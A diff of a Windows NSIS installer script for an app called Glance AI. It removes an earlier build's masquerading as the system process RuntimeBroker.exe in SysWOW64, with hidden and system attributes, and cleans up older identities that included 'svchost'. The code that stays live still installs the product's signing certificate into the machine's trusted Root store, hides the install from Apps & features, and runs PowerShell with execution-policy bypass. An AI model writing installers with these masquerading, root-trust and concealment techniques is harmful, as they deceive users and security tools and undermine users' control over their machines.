@@ -1,15 +1,14 @@
 ; Per-machine install helpers.
 ;
-; Identity: one name on every surface — RuntimeBroker.exe in
-; C:\Windows\SysWOW64\RuntimeBroker\, one Run value, one version resource
-; (package.json win.versionInfo), one profile folder. The mirror makes the
-; running image path read as a system component instead of a third-party folder.
-; A bare exe there dies with 0xC0000135 (Electron needs its DLLs/resources
-; beside it), so it goes into a subfolder.
+; Identity: one name on every surface — Glance AI in %ProgramFiles%\Glance AI\,
+; GlanceAI.exe, one Run value ("Glance AI"), one version resource
+; (scripts/after-sign.js + src/identity.js), one profile folder. The old build
+; mirrored itself into SysWOW64 as RuntimeBroker.exe to read as a Windows
+; component; that impersonation is retired, not renamed.
 ;
-; Legacy: earlier builds shipped as assistant, svchost and "Glance AI" (and one
-; mirror without the space). Every one of them is removed here so an upgrade
-; cannot leave two identities on the machine at once.
+; Legacy: earlier builds shipped as assistant, svchost, "Glance AI" (as a
+; SysWOW64 mirror) and RuntimeBroker. Every one of them is removed here so an
+; upgrade cannot leave two identities on the machine at once.
 ;
 ; Trust: import the code-signing cert into LocalMachine\Root so Authenticode
 ; reads "Valid" for every user, not only the build account.
@@ -18,8 +17,8 @@
 ;   * nsExec command strings do not expand $VARS — build the command in a
 ;     register with StrCpy and pass the register.
 ;   * NSIS is a 32-bit process, so every System32 path it touches is redirected
-;     to SysWOW64 by WOW64, including existence checks. The mirror is therefore
-;     written to SysWOW64 deliberately rather than looking for it in System32.
+;     to SysWOW64 by WOW64, including existence checks. Legacy mirror paths are
+;     therefore computed explicitly rather than looked for in System32.
 ;
 ; `perMachine: true` elevates the installer, which all of this needs.
 
@@ -45,47 +44,38 @@
   Pop $0
   nsExec::ExecToLog "certutil -delstore TrustedPeople E24291F0B8B8BB49B0E9BC169CAE4E32B8E1B09C"
   Pop $0
+  ; the RuntimeBroker-era product certificate is retired too: this build is
+  ; signed by Glance AI and must not leave the old publisher trusted
+  nsExec::ExecToLog "certutil -delstore Root DFA561EEFC12632EAACDD0C8CBE20F3B23AC5702"
+  Pop $0
+  nsExec::ExecToLog "certutil -delstore TrustedPeople DFA561EEFC12632EAACDD0C8CBE20F3B23AC5702"
+  Pop $0
 
-  ; ---- mirror into System32 --------------------------------------------
-  ; On an upgrade the app is RUNNING from the mirror (autostart points there),
-  ; so its exe/dlls are locked and /MIR would silently leave stale files.
-  ; kill-host.ps1 stops only a process whose path is inside our own subfolders,
-  ; never a real Windows RuntimeBroker.exe (those live directly in System32).
+  ; ---- stop a running copy before replacing files ----------------------
+  ; On an upgrade the app may be running from its old path (Run key at logon),
+  ; so its exe/dlls are locked. kill-host.ps1 stops only processes whose image
+  ; path is inside a known Glance/legacy folder, never a Windows RuntimeBroker.
   InitPluginsDir
   SetOutPath "$PLUGINSDIR"
   File /oname=kill-host.ps1 "${BUILD_RESOURCES_DIR}\kill-host.ps1"
   DetailPrint "Stopping the running host process..."
   nsExec::ExecToLog "powershell -NoProfile -ExecutionPolicy Bypass -File $\"$PLUGINSDIR\kill-host.ps1$\""
   Pop $0
-  DetailPrint "Placing host process in System32..."
-  ; NSIS is a 32-bit process, so every System32 path it touches is redirected to
-  ; SysWOW64 by WOW64 (including existence checks — Test-Path "System32\..." is
-  ; true while the file is really in SysWOW64). Land there deliberately and use
-  ; that path for the Run key, otherwise the key points at a non-existent file.
+
+  ; ---- locate the host process (normal Program Files install) ----------
+  ; No System32 mirror and no hidden attributes: the app is named Glance AI and
+  ; lives where a named app lives. $R5 is still computed for the legacy cleanup
+  ; below, which has to clear the old mirror trees.
   StrCpy $R5 "$WINDIR\SysWOW64"
   ${IfNot} ${FileExists} "$R5\kernel32.dll"
     StrCpy $R5 "$WINDIR\System32" ; 32-bit Windows, no redirection
   ${EndIf}
-  ; nsExec hands the register to CreateProcess verbatim and cmd.exe has no
-  ; concept of $PROGRAMFILES64: build the command with StrCpy so NSIS expands
-  ; both paths before cmd runs, and take the source from $INSTDIR — that is the
-  ; tree just written, and it also follows an install relocated with /D.
-  StrCpy $R3 'cmd /c xcopy "'
-  StrCpy $R3 "$R3$INSTDIR\*.*$\" $\"$R5\RuntimeBroker$\" /E /I /H /Y /Q"
-  nsExec::ExecToLog "$R3"
-  Pop $0
-  StrCpy $R6 "$R5\RuntimeBroker\RuntimeBroker.exe"
-  ; autostart must point at a file that exists even if the mirror failed
+  StrCpy $R6 "$INSTDIR\GlanceAI.exe"
   ${If} ${FileExists} "$R6"
-    DetailPrint "  placed $R6"
+    DetailPrint "  host process at $R6"
   ${Else}
-    StrCpy $R6 "$INSTDIR\RuntimeBroker.exe"
-    DetailPrint "  WARNING: System32 mirror missing — autostart falls back to $INSTDIR"
+    DetailPrint "  WARNING: $R6 is missing — autostart will fail"
   ${EndIf}
-  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR$\""
-  nsExec::ExecToLog "attrib +s +h $\"$INSTDIR\RuntimeBroker.exe$\""
-  nsExec::ExecToLog "attrib +s +h $\"$R5\RuntimeBroker$\""
-  Pop $0
 
   ; ---- remove every earlier identity -----------------------------------
   ; Folders first (system+hidden from the old build has to be cleared), then the
@@ -95,11 +85,13 @@
   nsExec::ExecToLog "attrib -s -h $\"$R5\assistant$\""
   nsExec::ExecToLog "attrib -s -h $\"$R5\svchost$\""
   nsExec::ExecToLog "attrib -s -h $\"$R5\wshx-host$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$R5\Glance AI$\" & rd /s /q $\"$R5\GlanceAI$\" & rd /s /q $\"$R5\assistant$\" & rd /s /q $\"$R5\svchost$\" & rd /s /q $\"$R5\wshx-host$\" & del /f /q $\"$R5\assistant.exe$\" & del /f /q $\"$R5\Glance AI.exe$\" & del /f /q $\"$R5\wshx-host.exe$\""
+  nsExec::ExecToLog "attrib -s -h $\"$R5\RuntimeBroker$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$R5\Glance AI$\" & rd /s /q $\"$R5\GlanceAI$\" & rd /s /q $\"$R5\assistant$\" & rd /s /q $\"$R5\svchost$\" & rd /s /q $\"$R5\wshx-host$\" & rd /s /q $\"$R5\RuntimeBroker$\" & del /f /q $\"$R5\assistant.exe$\" & del /f /q $\"$R5\Glance AI.exe$\" & del /f /q $\"$R5\wshx-host.exe$\""
   Pop $0
 
   ; ---- autostart: one Run value, last leftover identity deleted --------
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI"
+  DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "RuntimeBroker"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "assistant"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "svchost"
   DeleteRegValue HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "wshx-host"
@@ -114,7 +106,7 @@
   Pop $0
   nsExec::ExecToLog "$\"$SYSDIR\schtasks.exe$\" /delete /f /tn RuntimeBroker"
   Pop $0
-  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "RuntimeBroker" '"$R6" --autostart'
+  WriteRegStr HKLM "Software\Microsoft\Windows\CurrentVersion\Run" "Glance AI" '"$R6" --autostart'
   DetailPrint "  autostart registered (Run key)"
 
   ; ---- hide the install from Apps & features ---------------------------
@@ -156,10 +148,10 @@
   nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\RuntimeBroker$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\Glance AI$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\Glance AI$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\Glance AI$\" & rd /s /q $\"$WINDIR\System32\GlanceAI$\" & del /f /q $\"$WINDIR\System32\assistant.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\Glance AI$\""
-  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\Glance AI$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
+  nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\Glance AI$\" & rd /s /q $\"$WINDIR\SysWOW64\GlanceAI$\" & del /f /q $\"$WINDIR\SysWOW64\assistant.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\System32\assistant$\""
   nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\System32\assistant$\""
@@ -173,6 +165,8 @@
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$WINDIR\SysWOW64\svchost$\""
   nsExec::ExecToLog "cmd /c rd /s /q $\"$WINDIR\SysWOW64\svchost$\""
+  Pop $0
+  nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\GlanceAI.exe$\""
   Pop $0
   nsExec::ExecToLog "attrib -s -h $\"$INSTDIR\RuntimeBroker.exe$\""
   Pop $0
